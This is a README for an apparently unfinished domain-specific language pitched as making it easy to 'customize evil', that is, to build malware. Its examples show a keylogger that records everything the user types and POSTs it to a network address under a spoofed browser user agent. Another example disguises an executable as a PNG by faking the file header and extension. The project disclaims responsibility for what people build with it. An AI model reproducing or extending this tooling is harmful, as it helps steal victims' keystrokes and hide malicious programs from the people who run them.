# Malware Language

Customizing evil has never been so easy

### Warning, I take no responsibility for what you create with this
#### Warning 2, there is a lot of stuff not done with this project and therefore there really isn't much you can currently do.

### Example code
Basic example
```
main:{
  malware.name("MrSkeltal"); @ Sets the binary name of our file

  window.x("600");
  window.y("800");
  window.title("You just got hacked bruh!");
  window.url("https://mrskeltal.com/");

  window.run(); @ This runs our nice window, displaying the set url
  system.exit("0");
}
```

Network POST example
```
main:{
 wait:(time.until("22:00")){ @ Waits until 22:00 today before exiting
  info := keyboard.log(); @ Logs everything the user enters
 }

 network.set_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"); @ Updates the user agent for this request
 network.POST("address", "port", info); @ Will send whatever the user entered 

 system.exit(); @ Exits the program
}
```

Transmog example
```
main:{
 object.set_header_target("png"); @ Will result in the end product being identified as a png
 object.set_extension(".png"); @ Sets the program extension
 
 window.notify("Hello, World!"); @ Prints "Hello, World!" to the screen

 system.exit(); @ Exits the program
}
```
